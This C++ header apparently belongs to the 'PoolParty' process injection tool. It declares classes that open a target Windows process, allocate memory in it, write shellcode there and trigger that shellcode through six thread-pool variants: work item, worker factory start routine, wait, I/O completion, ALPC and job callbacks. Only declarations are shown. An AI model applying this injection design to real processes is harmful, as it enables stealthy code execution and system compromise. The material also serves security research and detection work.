#pragma once

#include <Windows.h>

#include <iostream>
#include <vector>
#include <string>

#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "Duplicator.hpp"
#include "Exceptions.hpp"
#include "Memory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD dwTargetPid;
	HANDLE hTargetPid;
	HANDLE hWorkerFactory;
	unsigned char* cShellcode;
	SIZE_T szShellcodeSize;
	PVOID ShellcodeAddress;
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation;

public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode);
	HANDLE GetTargetProcessHandle();
	HANDLE GetWorkerFactoryHandle();
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation();
	LPVOID AllocateShellcodeMemory();
	void WriteShellcode();
	virtual void SetupExecution() PURE;
	virtual void TriggerExecution();
	void Inject();
	~PoolParty();
};

class RemoteWorkItemInsertion : public PoolParty {
public: 
	RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteWorkItemInsertion();
};

class WorkerFactoryStartRoutineOverwrite : public PoolParty {
public:
	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	void TriggerExecution() override;
	~WorkerFactoryStartRoutineOverwrite();
};

class RemoteWaitCallbackInsertion : public PoolParty {
public:
	RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteWaitCallbackInsertion();
};

class RemoteIoCompletionCallbackInsertion : public PoolParty {
public:
	RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteIoCompletionCallbackInsertion();
};

class RemoteAlpcCallbackInsertion : public PoolParty {
public:
	RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteAlpcCallbackInsertion();
};

class RemoteJobCallbackInsertion : public PoolParty {
public:
	RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteJobCallbackInsertion();
};